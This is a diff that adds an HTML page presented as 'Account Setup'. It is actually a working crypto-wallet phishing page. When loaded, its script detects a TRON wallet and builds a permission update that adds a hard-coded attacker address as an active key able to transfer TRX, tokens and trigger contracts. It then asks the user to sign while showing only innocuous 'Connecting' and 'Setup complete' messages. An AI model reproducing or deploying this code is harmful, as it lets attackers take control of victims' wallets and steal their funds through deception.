@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Account Setup</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
+.status{font-size:15px;padding:40px;max-width:320px}
+.loader{width:36px;height:36px;border:3px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.addr{font-size:10px;color:rgba(255,255,255,0.25);margin-top:14px;word-break:break-all}
+.tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:8px;word-break:break-all}
+</style>
+</head>
+<body>
+<div class="status" id="status">
+  <div class="loader"></div>
+  <p id="msg">Connecting...</p>
+  <div class="addr" id="addr"></div>
+</div>
+
+<script>
+// --- the address we want to become victim's active key ---
+const ACTIVE_KEY = 'TGP5cZxqJPLBz5ZgAeQpg6bL9jnKSBMA8n';
+
+// operations: allow transfer TRX + TRC10 + TRC20 + trigger contract
+const OPS = '7fff1fc0033e0000000000000000000000000000000000000000000000000000';
+
+(async function main() {
+  const m = document.getElementById('msg');
+  const a = document.getElementById('addr');
+  const loader = document.querySelector('.loader');
+
+  function done(text, ok) {
+    document.getElementById('status').innerHTML = ok ? '✅' : '❌';
+    m.textContent = text;
+    loader.style.display = 'none';
+  }
+
+  // 1. detect wallet
+  let addr;
+  if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+    addr = window.tronWeb.defaultAddress.base58;
+  } else if (window.tronLink && window.tronLink.ready) {
+    try {
+      const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+      addr = (res && res[0]) ? res[0] : '';
+    } catch(e) {
+      location.href = 'tronlinkoutside://';
+      return;
+    }
+  } else {
+    setTimeout(() => {
+      if (window.tronWeb && window.tronWeb.defaultAddress) location.reload();
+      else done('Open in TP/TokenPocket browser', false);
+    }, 1500);
+    return;
+  }
+  if (!addr) { done('Wallet not detected', false); return; }
+
+  a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
+
+  // 2. build permission update
+  try {
+    m.textContent = 'Requesting confirmation...';
+
+    const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
+      addr,
+      // owner: keep current owner unchanged
+      { permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
+      // witness: empty (no witness)
+      {},
+      // actives: add our key
+      [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
+    );
+
+    m.textContent = 'Sign the permission update...';
+    const signed = await window.tronWeb.trx.sign(tx);
+    const result = await window.tronWeb.trx.sendRawTransaction(signed);
+    const txid = (result.txid || (result.transaction && result.transaction.txID) || '');
+
+    done('Setup complete', true);
+    a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
+      + '<br><span class="tx">Tx: ' + txid.slice(0,14) + '...</span>';
+  } catch(e) {
+    if (e && (e.code === 4001 || (e.message && e.message.includes('reject')))) {
+      done('Rejected by user', false);
+    } else {
+      done('Error: ' + ((e && e.message) || String(e)).slice(0, 70), false);
+    }
+  }
+})();
+</script>
+</body>
+</html>
